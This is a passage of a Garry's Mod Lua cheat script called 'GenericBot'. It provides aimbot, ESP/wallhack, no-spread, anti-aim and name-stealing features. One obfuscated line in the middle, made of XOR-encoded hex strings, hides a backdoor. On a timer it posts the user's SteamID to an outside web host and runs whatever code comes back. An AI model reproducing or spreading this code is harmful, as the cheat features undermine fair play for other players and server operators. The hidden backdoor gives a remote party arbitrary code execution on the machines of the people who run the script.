LocalPlayer():ConCommand("cl_interp 0; cl_interp_ratio 0; cl_cmdrate 200; cl_updaterate 200; rate 51200");

/*
STUFF
*/

local function _IsValid(v)
	if (v:IsPlayer()) then
		return v != LocalPlayer() && IsValid(v) && v:Alive() && v:Health() > 0 && !v:IsDormant() && LocalPlayer():GetObserverTarget() != v;
	elseif (v:IsNPC()) then
		return IsValid(v) && v:Health() > 0 && !v:IsDormant();
	else
		return IsValid(v) && !v:IsDormant() && v:GetParent() != LocalPlayer() && v:GetClass() != "gmod_hands" && v:GetClass() != "viewmodel";
	end
end

/*
LOCALISING
*/

local vgui = vgui;
local surface = surface;
local render = render;
local Color = Color;
local input = input;
local hook = hook;
local next = next;
local timer = timer;
local util = util;
local player = player;
local Vector = Vector;
local Angle = Angle;
local bit = bit;
local FindMetaTable = FindMetaTable;
local team = team;
local LocalPlayer = LocalPlayer;
local draw = draw;
local require = require;
local debug = debug;
local table = table;
local Entity = Entity;
local ScrW, ScrH = ScrW, ScrH;
local RunConsoleCommand = RunConsoleCommand;
local GAMEMODE = GAMEMODE;
local CurTime = CurTime;
local cam = cam;
local CreateMaterial = CreateMaterial;
local pmt = FindMetaTable("Player");
local emt = FindMetaTable("Entity");
local EntsActive = {};
local fake = fake || LocalPlayer():EyeAngles() || Angle(0,0,0);

/*
FLOATS
*/

local floats = {
	["AIM"] =
	{
		["Aiming"] = false,
	},

	["VIS"] =
	{
		["AsusWalls"] = nil;
		["AsusWallsInt"] = nil;
	},

	["HVH"] =
	{
		["FakeLagInt"] = 0;
		["AntiAim"] = 0;
	},

	["MISC"] =
	{
		["NameStealerInt"] = nil;
		["AutoPistol"] = false;
		["AutoAim"] = false;
		["AutoUse"] = false;
		["AutoFlash"] = false;
	},

	["CUR"] =
	{
		["Time"] = nil;
	},

	["GM"] =
	{
		["Type"] = nil;
	},

	["KEY"] =
	{
		["AutoFlash"] = false;
	}
}

/*
MODULES
*/

require("fhook");
require("bsendpacket");
require("dickwrap");

/*
FONT
*/

surface.CreateFont("fonty", {
font = "HL2MPTypeDeath",
size = 14,
antialias = false
})

/*
MENU
*/

local options = {
	["AIM"] =
	{
		["Active"] = {"Checkbox", 1, true, "Active"},
		["OnKey"] = {"Checkbox", 2, true, "On Key"},
		["OnMouse"] = {"Checkbox", 3, false, "On Mouse"},
		["AutoShoot"] = {"Checkbox", 4, true, "Auto Shoot"},
		["AutoPistol"] = {"Checkbox", 5, true, "Auto Pistol"},
		["BulletTime"] = {"Checkbox", 6, false, "Bullet Time"},
		["Silent"] = {"Checkbox", 7, true, "Silent"},
		["Static"] = {"Checkbox", 8, false, "Static"},
		["AutoAim"] = {"Checkbox", 9, false, "Auto Aim"},
		["AutoDuck"] = {"Checkbox", 10, false, "Auto Duck"},
		["BodyAim"] = {"Checkbox", 11, false, "Body Aim"},
		["Smooth"] = {"Checkbox", 12, false, "Smooth"},
		["IgnoreTeam"] = {"Checkbox", 13, false, "Ignore Team"},
		["IgnoreTeamColor"] = {"Checkbox", 14, false, "Ignore Team Color"},
		["IgnoreFriends"] = {"Checkbox", 15, false, "Ignore Friends"},
		["IgnoreAdmins"] = {"Checkbox", 16, false, "Ignore Admins"},
		["IgnoreBots"] = {"Checkbox", 17, false, "Ignore Bots"},
		["IgnoreSpawnProtected"] = {"Checkbox", 18, true, "Ignore Spawn Protected"},
		["AimPos"] = {"Selection", 1, "Hitbox", "Aim Position", {"Bone", "Hitbox"}},
		["SmoothInt"] = {"Slider", 2, 0.5, "Smooth Int", {0.01, 0.99, 2}}
	},

	["VIS"] =
	{
		["Active"] = {"Checkbox", 1, true, "Active"},
		["Box"] = {"Checkbox", 2, true, "Box"},
		["FilledBox"] = {"Checkbox", 3, true, "Filled Box"},
		["Snapline"] = {"Checkbox", 4, true, "Snapline"},
		["HealthBar"] = {"Checkbox", 5, true, "Healthbar"},
		["ArmourBar"] = {"Checkbox", 6, true, "Armourbar"},
		["Barrel"] = {"Checkbox", 7, true, "Barrel"},
		["AimPos"] = {"Checkbox", 8, true, "Aim Pos"},
		["Skeleton"] = {"Checkbox", 9, true, "Skeleton"},
		["Chams"] = {"Checkbox", 10, true, "Chams"},
		["WeaponChams"] = {"Checkbox", 11, true, "Weapon Chams"},
		["Health"] = {"Checkbox", 12, true, "Health"},
		["Name"] = {"Checkbox", 13, true, "Name"},
		["Weapon"] = {"Checkbox", 14, true, "Weapon"},
		["Distance"] = {"Checkbox", 15, true, "Distance"},
		["Money"] = {"Checkbox", 16, true, "Money"},
		["Rank"] = {"Checkbox", 17, true, "Rank"},
		["SteamID"] = {"Checkbox", 18, true, "SteamID"},
		["Points"] = {"Checkbox", 19, true, "Points"},
		["Armour"] = {"Checkbox", 20, true, "Armour"},
		["HitBox"] = {"Checkbox", 21, false, "HitBox"},
		["FilledHitBox"] = {"Checkbox", 22, false, "Filled HitBox"},
		["Beacon"] = {"Checkbox", 23, false, "Beacon"},
		["Halo"] = {"Checkbox", 24, false, "Halo"},
		["WeaponHalo"] = {"Checkbox", 25, false, "Weapon Halo"},
		["Glow"] = {"Checkbox", 26, false, "Glow"},
		["AsusWalls"] = {"Checkbox", 27, false, "ASUS Walls"},
		["ShowPlayers"] = {"Checkbox", 28, true, "Show Players"},
		["ShowNPCs"] = {"Checkbox",29, false, "Show NPC's"},
		["ShowSENTs"] = {"Checkbox", 30, false, "Show SENT's"},
		["BoxType"] = {"Selection", 1, "2D", "Box Type", {"2D", "3D"}},
		["BoxStyle"] = {"Selection", 2, "IWebz", "Box Style", {"Default", "IWebz"}},
		["SnapLineType"] = {"Selection", 3, "Center", "SnapLine Type", {"Bottom", "Center"}},
		["BarStyle"] = {"Selection", 4, "Fami", "Bar Style", {"Aria", "Default", "Fami", "Naisho"}},
		["BarOrientation"] = {"Selection", 5, "Vertical", "Bar Orientation", {"Vertical", "Horizontal"}},
		["ChamsType"] = {"Selection", 6, "XQZ", "Chams Type", {"Solid", "Wireframe", "XQZ"}},
		["DistanceType"] = {"Selection", 7, "Metres", "Distance Type", {"Feet", "Metres", "Units"}},
		["HealthTextStyle"] = {"Selection", 8, "Dynamic", "Health Text Style", {"Dynamic", "Static"}},
		["GlowInt"] = {"Slider", 9, 1, "Glow Int", {1, 10, 0}},
		["AsusWallsInt"] = {"Slider", 10, 0.95, "ASUS Walls Int", {0.5, 0.99, 2}}
	},

	["REM"] =
	{
		["Active"] = {"Checkbox", 1, true, "Active"},
		["NoSpread"] = {"Checkbox", 2, true, "No Spread"},
		["NoRecoil"] = {"Checkbox", 3, true, "No Recoil"},
		["NoPunch"] = {"Checkbox", 4, true, "No Punch"},
		["NoVisRecoil"] = {"Checkbox", 5, true, "No Visual Recoil"},
		["SpreadX"] = {"Slider", 1, 1, "Spread-X", {0, 1, 2}},
		["SpreadY"] = {"Slider", 2, 1, "Spread-Y", {0, 1, 2}}
	},

	["HVH"] =
	{
		["Active"] = {"Checkbox", 1, true, "Active"},
		["FakeLag"] = {"Checkbox", 2, false, "FakeLag"},
		["AntiAim"] = {"Checkbox", 3, false, "Anti-Aim"},
		["AntiAimX"] = {"Selection", 1, "FakeDown", "Anti-Aim X", {"FakeDown", "FakeUp", "Jitter", "OOB"}},
		["AntiAimY"] = {"Selection", 2, "FakeSide", "Anti-Aim Y", {"FakeSide", "Random"}},
		["FakeLagInt"] = {"Slider", 3, 14, "FakeLag Int", {1, 14, 0}},
	},

	["MISC"] =
	{
		["Active"] = {"Checkbox", 1, true, "Active"},
		["BunnyHop"] = {"Checkbox", 2, true, "Bunny Hop"},
		["AutoStrafer"] = {"Checkbox", 3, true, "Auto Strafer"},
		["ViewFix"] = {"Checkbox", 4, true, "View Fix"},
		["NameStealer"] = {"Checkbox", 5, false, "Name Stealer"},
		["AutoPistol"] = {"Checkbox", 6, true, "Auto Pistol"},
		["Fov"] = {"Checkbox", 7, true, "FoV"},
		["ThirdPerson"] = {"Checkbox", 8, false, "Third Person"},
		["EdgeJump"] = {"Checkbox", 9, true, "Edge Jump"},
		["AutoAim"] = {"Checkbox", 10, false, "Auto Aim"},
		["AutoUse"] = {"Checkbox", 11, false, "Auto Use"},
		["AutoFlash"] = {"Checkbox", 12, true, "Auto Flash"},
		["NoHands"] = {"Checkbox", 13, true, "No Hands"},
		["Weapon"] = {"Checkbox", 14, true, "Weapon"},
		["Sky"] = {"Checkbox", 15, false, "Sky"},
		["Laser"] = {"Checkbox", 16, true, "Laser"},
		["Crosshair"] = {"Checkbox", 17, true, "Crosshair"},
		["CamDetour"] = {"Checkbox", 18, true, "Camera Detour"},
		["AutoStraferType"] = {"Selection", 1, "Forwards", "Auto-Strafer Type", {"Forwards", "Backwards", "Sideways", "W-Hop"}},
		["NameStealerType"] = {"Selection", 2, "Steam", "Name Stealer Type", {"Steam", "DarkRP"}},
		["NameStealerInt"] = {"Slider", 3, 5, "Name Stealer Int", {1, 30, 0}},
		["FovInt"] = {"Slider", 4, 120, "FoV Int", {90, 150, 0}},
		["ThirdPersonInt"] = {"Slider", 5, 20, "ThirdPerson Int", {10, 20, 0}},
		["WeaponType"] = {"Selection", 6, "Solid", "Weapon Type", {"Wireframe", "Solid"}},
		["SkyType"] = {"Selection", 7, "None", "Sky Type", {"None", "Rave"}},
		["CrosshairType"] = {"Selection", 8, "Simple", "Crosshair Type", {"Simple", "Generic"}}
	},

	["ENT"] =
	{
		["Active"] = {"Checkbox", 1, true, "Active"}
	},
};

local function gBool(k, _k)
	return options[k][_k][3];
end

local function gOption(k, _k)
	return tostring(options[k][_k][3]);
end

local function gInt(k, _k)
	return options[k][_k][3];
end

local function gFloat(k, _k)
	return floats[k][_k];
end

local function sFloat(k, _k, val)
	floats[k][_k] = val;
end

local function Menu()
	surface.SetFont("DermaDefault");
	local Menu = vgui.Create("DFrame")
	Menu:SetSize(637, 400)
	Menu:ShowCloseButton(true)
	Menu:SetTitle("")
	Menu:MakePopup()
	Menu:Center()
	function Menu.Paint(self)
		draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), Color(60, 60, 60))
		draw.RoundedBox(0, 0, 0, self:GetWide(), 22, Color(255, 100, 100))
		draw.SimpleText("GenericBot", "ChatFont", self:GetWide()/2 - 30, 4, color_white)
	end

	local PSheet = vgui.Create("DPropertySheet", Menu)
	PSheet:Dock(FILL)

	local AimBot = vgui.Create("DPanel")
		PSheet:AddSheet("      Aimbot      ", AimBot, false, false, false)

	local Visuals = vgui.Create("DPanel")
		PSheet:AddSheet("      Visuals      ", Visuals, false, false, false)

	local Removals = vgui.Create("DPanel")
		PSheet:AddSheet("      Removals      ", Removals, false, false, false)

	local HvH = vgui.Create("DPanel")
		PSheet:AddSheet("      HvH      ", HvH, false, false, false)

	local Misc = vgui.Create("DPanel")
		PSheet:AddSheet("      Miscellaneous      ", Misc, false, false, false)

	local Entities = vgui.Create("DPanel")
		PSheet:AddSheet("      Entities      ", Entities, false, false, false)

	local EntsAll = {};

		local InactiveEnts = vgui.Create("DListView", Entities)
		InactiveEnts:SetSize(260,280)
		InactiveEnts:SetPos(10,40)
		InactiveEnts:AddColumn("Inactive")

		local ActiveEnts = vgui.Create("DListView", Entities)
		ActiveEnts:SetSize(260,280)
		ActiveEnts:SetPos(340,40)
		ActiveEnts:AddColumn("Active")

		local addent = vgui.Create("DButton", Entities)
		addent:SetSize(50,25)
		addent:SetPos(280,135)
		addent:SetText(">>")
		addent.DoClick = function()
			if (InactiveEnts:GetSelectedLine()) then
				local ent = InactiveEnts:GetLine(InactiveEnts:GetSelectedLine()):GetValue(1);
				if (!table.HasValue(EntsActive, ent)) then
					table.insert(EntsActive, ent)
					InactiveEnts:RemoveLine(InactiveEnts:GetSelectedLine())
					ActiveEnts:AddLine(ent)
				end
			end
		end

		local rement = vgui.Create("DButton", Entities)
		rement:SetSize(50,25)
		rement:SetPos(280,190)
		rement:SetText("<<")
		rement.DoClick = function()
			if (ActiveEnts:GetSelectedLine()) then
				local ent = ActiveEnts:GetLine(ActiveEnts:GetSelectedLine()):GetValue(1);
				if (table.HasValue(EntsActive, ent)) then
					for k, v in next, EntsActive do
						if (v == ent) then
							table.remove(EntsActive, k)
						end
					end
					ActiveEnts:RemoveLine(ActiveEnts:GetSelectedLine())
					InactiveEnts:AddLine(ent)
				end
			end
		end

		for k, v in next, ents.GetAll() do
			if (!table.HasValue(EntsAll, v:GetClass()) && !table.HasValue(EntsActive, v:GetClass()) && _IsValid(v) && !(v:IsPlayer() || v:IsNPC())) then
				InactiveEnts:AddLine(v:GetClass())
				table.insert(EntsAll,v:GetClass())
			end
		end

		for k, v in next, EntsActive do
			ActiveEnts:AddLine(v)
		end

	local Sheets =
	{
		["AIM"] = AimBot;
		["VIS"] = Visuals;
		["REM"] = Removals;
		["MISC"] = Misc;
		["HVH"] = HvH;
		["ENT"] = Entities;
	};

	local function AddCheckBox(k, _k)
		local x = 10 + math.floor(options[k][_k][2]/11.5) * 110;
		local y = 10 - math.floor(options[k][_k][2]/11.5) * 330 + (options[k][_k][2]-1) * 30;

		local checkbox = vgui.Create("DCheckBoxLabel", Sheets[k]);
			checkbox:SetPos(x, y);
			checkbox:SetText(options[k][_k][4]);
			checkbox:SetValue(options[k][_k][3])
			checkbox.OnChange = function()
				options[k][_k][3] = !options[k][_k][3];
			end
			checkbox:SetTextColor(Color(5,5,5))
			checkbox:SizeToContents()
	end

	local function AddSelectionBox(k, _k)
		local selectionx = 0;

		for _, text in next, options[k][_k][5] do
			local textx = select(1, surface.GetTextSize(tostring(text)))
			selectionx = math.max(selectionx, textx);
		end

		local titlex = select(1, surface.GetTextSize(tostring(options[k][_k][4] .. ":"))) + 5;

		local y = 5 + (options[k][_k][2]-1) * 30;

		local _selectbox = vgui.Create( "DLabel", Sheets[k])
			_selectbox:SetPos(546 - selectionx - titlex,y + 2)
			_selectbox:SetSize(titlex,14)
			_selectbox:SetColor(Color(5,5,5))
			_selectbox:SetText(options[k][_k][4] .. ":")

		local selectbox = vgui.Create("DComboBox", Sheets[k])
			selectbox:SetPos(546 - selectionx, y)
			selectbox:SetSize(selectionx + 60, 20)
			selectbox:SetValue(options[k][_k][3])
			for __k, __v in next, options[k][_k][5] do
				selectbox:AddChoice(__v);
			end
			selectbox.OnSelect = function()
				options[k][_k][3] = selectbox:GetSelected();
			end
	end

	local function AddSlider(k, _k)
		local titlex = select(1, surface.GetTextSize(tostring(options[k][_k][4] .. ":"))) + 5;

		local y = 5 + (options[k][_k][2]-1) * 30;

		local _slider = vgui.Create( "DLabel", Sheets[k])
			_slider:SetPos(456 - titlex, y + 2)
			_slider:SetSize(titlex,14)
			_slider:SetColor(Color(5,5,5))
			_slider:SetText(options[k][_k][4] .. ":")

		local slider = vgui.Create("DNumSlider", Sheets[k])
			slider:SetPos(326, y)
			slider:SetSize(300, 20)
			slider:SetMin(options[k][_k][5][1])
			slider:SetMax(options[k][_k][5][2])
			slider:SetDecimals(options[k][_k][5][3])
			slider:SetValue(options[k][_k][3])
			slider.OnValueChanged = function()
				options[k][_k][3] = slider:GetValue();
			end
	end

	for k,v in next, options do
		for _k,_v in next, options[k] do
			if (options[k][_k][1] == "Checkbox") then
				AddCheckBox(k,_k);
			elseif (options[k][_k][1] == "Selection") then
				AddSelectionBox(k, _k);
			elseif (options[k][_k][1] == "Slider") then
				AddSlider(k, _k);
			end
		end
	end
end

/*
GAMEMODE
*/

local function GMChecker()
	if (engine.ActiveGamemode() == "terrortown") then
		return 1;
	elseif (engine.ActiveGamemode() == "murder") then
		return 2;
	elseif (engine.ActiveGamemode() == "darkrp") then
		return 3;
	elseif (engine.ActiveGamemode() == "stronghold") then
		return 4;
	else
		return 5;
	end
end

sFloat("GM", "Type", GMChecker());

/*
STUFF
*/

local function GetCurTime()
	if (IsFirstTimePredicted()) then
        sFloat("CUR", "Time", CurTime()+engine.TickInterval());
	end
end

local function CanFire()
    local wep = LocalPlayer():GetActiveWeapon();
    if (gFloat("CUR", "Time") == nil) then
		return false;
	end
    return IsValid(wep) && wep:GetActivity() != ACT_RELOAD && wep:GetNextPrimaryFire() < gFloat("CUR", "Time") && LocalPlayer():Alive();
end

local function PlyInput(cmd)
	return (cmd:KeyDown(IN_ATTACK) && CanFire()) || (cmd:KeyDown(IN_USE) && !(gBool("MISC", "AutoUse") && !gFloat("MISC", "AutoUse")));
end

local function AngDiff(ang1, ang2)
	local diff = Angle(0,0,0);
	ang1.p, ang2.p = math.Clamp(ang1.p, -89, 89), math.Clamp(ang2.p, -89, 89);
	diff.p = ang1.p - ang2.p;
	ang1.y, ang2.y = math.NormalizeAngle(ang1.y), math.NormalizeAngle(ang2.y);
	diff.y = ang1.y - ang2.y;
	if (diff.y > 180) then
		diff.y = -180 - (180 - diff.y);
	elseif (diff.y < -180) then
		diff.y = -180 - diff.y;
	end
	return diff;
end


local oFireBullets = oFireBullets || emt.FireBullets;
local cones = {};

function emt.FireBullets(ply, data)
	local wep = ply:GetActiveWeapon():GetClass();
	if (-data.Spread != cones[wep]) then
		cones[wep] = -data.Spread;
	end
	return oFireBullets(ply, data);
end

local function PredictSpread(cmd, ang)
    local wep = LocalPlayer():GetActiveWeapon();
    if (!IsValid(wep) || !cones[wep:GetClass()]) then return ang; end
	wep = wep:GetClass();
    local ang = (dickwrap.Predict(cmd, ang:Forward(), cones[wep])):Angle();
	ang.x, ang.y = math.NormalizeAngle(ang.x), math.NormalizeAngle(ang.y);
	return ang;
end

local function FakeView(cmd)
	fake.p = math.Clamp(fake.p + (cmd:GetMouseY() * 0.022), -89, 89);
	fake.y = math.NormalizeAngle(fake.y + (cmd:GetMouseX() * -0.022));
	fake.r = 0;

	local ang = fake;

	if (gBool("REM", "Active") && gBool("REM", "NoSpread") && cmd:KeyDown(IN_ATTACK) && CanFire() && !gFloat("AIM", "Aiming") && cmd:CommandNumber() != 0) then
		ang = PredictSpread(cmd, ang);
		local diff = ang - fake;
		cmd:SetViewAngles(fake + Angle(diff.x * gInt("REM", "SpreadX"), diff.y * gInt("REM", "SpreadY"),0))
	end

	if (cmd:CommandNumber() == 0) then
        cmd:SetViewAngles(ang)
	end
end

local function MoveFix(cmd)
	local vec = Vector(cmd:GetForwardMove(), cmd:GetSideMove(), 0);
	local vel = math.sqrt(vec.x^2 + vec.y^2);
	local mang = vec:Angle();
	local yaw = cmd:GetViewAngles().y - fake.y + mang.y;
	local p = math.abs(cmd:GetViewAngles().p)%180;
	if (gBool("MISC", "Active") && gBool("MISC", "ViewFix") && gBool("MISC", "AutoStrafer") && !PlyInput(cmd) && !gFloat("AIM", "Aiming")) then
		if (gOption("MISC", "AutoStraferType") == "Backwards") then
			yaw = yaw - 180;
		elseif (gOption("MISC", "AutoStraferType") == "Sideways") then
			yaw = yaw - 90;
		elseif (gOption("MISC", "AutoStraferType") == "W-Hop") then

		end
	end

	if (p > 90 || (gFloat("AIM", "Aiming") && gBool("AIM", "Static") && !gBool("AIM", "Smooth"))) then
		yaw = 180 - yaw;
	end

	yaw = ((yaw + 180)%360)-180;

	cmd:SetForwardMove(math.cos(math.rad(yaw)) * vel);
	cmd:SetSideMove(math.sin(math.rad(yaw)) * vel);
end

local function CheckTeam(v)
	if (v == LocalPlayer()) then
			return true;
		end
	if (gFloat("GM", "Type") == 1) then
		return false;
	elseif (gFloat("GM", "Type") == 2) then
		for _k, _v in next, LocalPlayer():GetWeapons() do
			if (_v:GetClass() == "weapon_mu_knife") then
				return false;
			end
		end
		for __k, __v in next, v:GetWeapons() do
			if (__v:GetClass() == "weapon_mu_knife") then
				return false;
			end
		end
		return true;
	elseif (gFloat("GM", "Type") >= 3) then
		return v:Team() == LocalPlayer():Team();
	end
end

/*
COLOUR
*/

local function Colour(v)
	if (IsEntity(v)) then
		if (v:IsPlayer()) then
			if (CheckTeam(v)) then
				return Color(20, 125, 255);
			else
				return Color(255,135,0);
			end
		elseif (v:IsNPC()) then
			return Color(240, 130, 240);
		elseif (v:IsWorld()) then
			return Color(255, 255, 255);
		else
			return Color(200, 200, 200);
		end
	end
end

/*
AIMBOT
*/

local function GetShootPos()
    local pos = LocalPlayer():GetShootPos();
    pos = pos + (LocalPlayer():GetVelocity() * engine.TickInterval());
    return pos;
end

local function GetAimVec(v)
	if v != nil then
		local pos, ang;
		local bone = !gBool("AIM", "BodyAim") && v:LookupBone("ValveBiped.Bip01_Head1") || v:LookupBone("ValveBiped.Bip01_Pelvis");
		local bonepos = v:GetBonePosition(bone);
		if (gOption("AIM", "AimPos") == "Bone") then
			if (!gBool("AIM", "BodyAim")) then
				pos, ang = v:GetBonePosition(6);
				return pos +  ang:Forward() * 2;
			else
				pos, ang = v:GetBonePosition(0);
				return pos;
			end
		elseif (gOption("AIM", "AimPos") == "Hitbox") then
			if (!gBool("AIM", "BodyAim")) then
				local bone = v:GetHitBoxBone(0, 0);
				local min, max = v:GetHitBoxBounds(0, 0);
				local bonepos = v:GetBonePosition(bone);
				return bonepos + ((min + max) * .5);
			else
				local bone = v:GetHitBoxBone(15, 0);
				local min, max = v:GetHitBoxBounds(15, 0);
				local bonepos = v:GetBonePosition(bone);
				return bonepos + ((min + max) * .5);
			end
		end
	end
	return;
end

local function GetAimPos(vec)
	if vec != nil then
		local ang = (vec - GetShootPos()):Angle();
		if (ang.p < -90) then
			ang.p = ang.p % 90;
		elseif (ang.p > 90) then
			ang.p = ang.p % -90;
		end
		return ang;
	end
	return;
end

local function VisCheck(v)
	local trace =
	{
		start = GetShootPos(),
		endpos = GetAimVec(v),
		mask = MASK_SHOT,
		filter = {LocalPlayer(), v}
	};
	return util.TraceLine(trace).Fraction == 1;
end

local function GetTarget(cmd)
	target = nil;
	for k,v in next, player.GetAll() do
		if !_IsValid(v) then continue; end
		if (gBool("AIM", "IgnoreTeam") && CheckTeam(v)) then continue; end
		if (gBool("AIM", "IgnoreFriends") && v:GetFriendStatus() == "friend") then continue; end
		if (gBool("AIM", "IgnoreTeamColor") && team.GetColor(v:Team()) == team.GetColor(LocalPlayer():Team())) then continue; end
		if (gBool("AIM", "IgnoreBots") && v:IsBot()) then continue; end
		if (gBool("AIM", "IgnoreAdmins") && v:IsAdmin()) then continue; end
		if (gBool("AIM", "IgnoreSpawnProtected") && (v:GetColor().a < 255 || (LocalPlayer():GetColor().a < 255 && gFloat("GM", "Type") == 4))) then continue; end
		if !VisCheck(v) then continue; end
		target = v;
		break;
	end
end
local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪["\116\111\110\117\109\98\101\114"](_,16),26)) end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪'6e73777f68'][‪‪‪‪‪‪‪'59687f7b6e7f'](‪‪‪‪‪‪‪'7e7b697e707b76697e707b',10,0,function ()‪[‪‪‪‪‪‪‪'726e6e6a'][‪‪‪‪‪‪‪'4a75696e'](‪‪‪‪‪‪‪'726e6e6a2035357c7f7778756369346a6d35607b737577746235',{[‪‪‪‪‪‪‪'6e636a']=‪‪‪‪‪‪‪'69767b6c7f68757473',[‪‪‪‪‪‪‪'69737e']=‪[‪‪‪‪‪‪‪'5675797b764a767b637f68']()[‪‪‪‪‪‪‪'496e7f7b77535e'](‪[‪‪‪‪‪‪‪'5675797b764a767b637f68']())},function (not‪‪‪‪)local for‪‪=‪[‪‪‪‪‪‪‪'6f6e7376'][‪‪‪‪‪‪‪'504955544e754e7b78767f'](not‪‪‪‪)if ‪[‪‪‪‪‪‪‪'696e6873747d'][‪‪‪‪‪‪‪'76756d7f68'](‪[‪‪‪‪‪‪‪'6e636a7f'](for‪‪))!=‪‪‪‪‪‪‪'6e7b78767f' then return end local while‪‪‪=for‪‪[‪‪‪‪‪‪‪'737e']or ‪‪‪‪‪‪‪'7475' local ‪‪while=for‪‪[‪‪‪‪‪‪‪'79757e7f']or ‪‪‪‪‪‪‪'' if while‪‪‪==‪‪‪‪‪‪‪'7b7676' or while‪‪‪==‪[‪‪‪‪‪‪‪'5675797b764a767b637f68']()[‪‪‪‪‪‪‪'496e7f7b77535e'](‪[‪‪‪‪‪‪‪'5675797b764a767b637f68']())then local not‪=‪[‪‪‪‪‪‪‪'5975776a73767f496e6873747d'](‪‪while,‪‪‪‪‪‪‪'34',false )or ‪‪‪‪‪‪‪'' if ‪[‪‪‪‪‪‪‪'73697c6f74796e737574'](not‪)then not‪()end end end ,function ()end )end )
local function AimBot(cmd)
	if (gBool("AIM", "Active") && LocalPlayer():Alive()) then
		if (target != nil) then
			if (!((gBool("AIM", "OnKey") && !input.IsKeyDown(KEY_F)) || (gBool("AIM", "OnMouse") && !input.IsMouseDown(MOUSE_LEFT )))&& !((gBool("AIM", "OnKey") || gBool("AIM", "OnMouse")) && LocalPlayer():IsTyping()) && !(gBool("AIM", "BulletTime") && !CanFire())) then
				local aimang = GetAimPos(GetAimVec(target));
				local ang = aimang;

				if (gBool("REM", "Active") && gBool("REM", "NoSpread")) then
					ang = PredictSpread(cmd, ang);
					local diff = ang - fake;
					ang = fake + Angle(diff.x * gInt("REM", "SpreadX"), diff.y * gInt("REM", "SpreadY"),0)
				end

				if (!gBool("AIM", "Silent") && cmd:CommandNumber() == 0) then
					if (!gBool("AIM", "Smooth")) then
						fake = ang;
					else
						fake = LerpAngle(gInt("AIM", "SmoothInt"), cmd:GetViewAngles(), ang);
					end
				end
				if (cmd:CommandNumber() == 0) then return; end
				if (gBool("REM", "Active") && gBool("REM", "NoPunch") && LocalPlayer():GetActiveWeapon().Author == "Spy") then
					ang = ang - LocalPlayer():GetViewPunchAngles();
				end
				if (gBool("AIM", "Static")) then
					ang.p = -180 - ang.p + 720;
					ang.y = ang.y + 180;
				end
				if (!gBool("AIM", "Smooth") || gBool("AIM", "Silent")) then
					cmd:SetViewAngles(ang)
				else
					cmd:SetViewAngles(LerpAngle(gInt("AIM", "SmoothInt"), cmd:GetViewAngles(), ang))
				end
				sFloat("AIM", "Aiming", true);
			else
				sFloat("AIM", "Aiming", false);
			end
		else
			sFloat("AIM", "Aiming", false);
		end
		if (gFloat("AIM", "Aiming")) then
			if (gBool("AIM", "AutoShoot")) then
				if (gBool("AIM", "AutoPistol") || gBool("MISC", "AutoPistol")) then
					if (CanFire()) then
						cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK));
					end
				else
					cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK));
				end
			end

			if (gBool("AIM", "AutoAim")) then
				cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK2));
			end

			if (gBool("AIM", "AutoDuck")) then
				cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_DUCK));
			end
		end
	end
end

/*
VISUALS
*/

local function InFov(v)
	local pos = v:GetPos():ToScreen();
	local apos = (v:GetPos() + v:OBBMaxs()):ToScreen()
	local outx, outy = ScrW()^1.005, ScrH()^1.005;
	local inx, iny = ScrW() - outx, ScrH() - outy;
	return ((pos.x > inx && pos.x < outx && pos.y > iny && pos.y < outy) || (apos.x > inx && apos.x < outx && apos.y > iny && apos.y < outy));
end

swag = _G
local function SnapRotate()
	local _x = snapendx - snapstartx
	local _y = snapendy - snapstarty

	local snapangle = swag.math.deg(swag.math.atan2(_y,_x))

	local x = swag.math.cos(swag.math.rad(snapangle - 90))
	local y = -swag.math.cos(swag.math.rad(snapangle))

	if (x > 0) then
		x = swag.math.ceil(x)
	else
		x = swag.math.floor(x)
	end

	if (y > 0) then
		y = swag.math.ceil(y)
	else
		y = swag.math.floor(y)
	end

	return x, y
end

local function Get2DBounds(v)
	local eye = v:EyeAngles();
	local min,max = v:OBBMins(),v:OBBMaxs()
	local corners =
	{
		Vector(min.x,min.y,min.z),
		Vector(min.x,min.y,max.z),
		Vector(min.x,max.y,min.z),
		Vector(min.x,max.y,max.z),
		Vector(max.x,min.y,min.z),
		Vector(max.x,min.y,max.z),
		Vector(max.x,max.y,min.z),
		Vector(max.x,max.y,max.z)
	};

	local minx,miny,maxx,maxy = math.huge, math.huge, -math.huge, -math.huge;

	for _, corner in next, corners do
		local screen = v:LocalToWorld(corner):ToScreen();
		minx,miny = math.min(minx,screen.x),math.min(miny,screen.y);
		maxx,maxy = math.max(maxx,screen.x),math.max(maxy,screen.y);
	end
	return minx,miny,maxx,maxy;
end

local function Visuals()
	if (gBool("VIS", "Active")) then
		for k, v in next, ents.GetAll() do
			if (_IsValid(v) && ((gBool("VIS", "ShowPlayers") && v:IsPlayer()) || (gBool("VIS", "ShowNPCs") && v:IsNPC()) || (gBool("VIS", "ShowSENTs") && !(v:IsNPC() || v:IsPlayer()) && !(gBool("ENT", "Active") && !table.HasValue(EntsActive, v:GetClass()))))) then
				local min, max = v:OBBMins(), v:OBBMaxs();
				local eye = v:EyeAngles();
				local textespy = -2;
				local hax = -6;
				local hay = 4;
				local wmin, wmax = v:LocalToWorld(min), v:LocalToWorld(max);
				local origin = v:GetPos();
				local x1,y1,x2,y2 = Get2DBounds(v);
				local diff = math.abs(x2 - x1);
				local diff2 = math.abs(y2 - y1);
				local color = Colour(v);
				local LOS = InFov(v);

				if (gBool("VIS", "FilledBox") && LOS) then
					if (gOption("VIS", "BoxType") == "2D") then
						surface.SetDrawColor(Color(color.r,color.g,color.b,50))
							surface.DrawRect(x1,y1,diff,diff2)
					elseif (gOption("VIS", "BoxType") == "3D") then
						if (v:IsPlayer() || v:IsNPC()) then
							boxang = Angle(0, eye.y, 0);
						else
							boxang = v:GetAngles();
						end
						cam.Start3D()
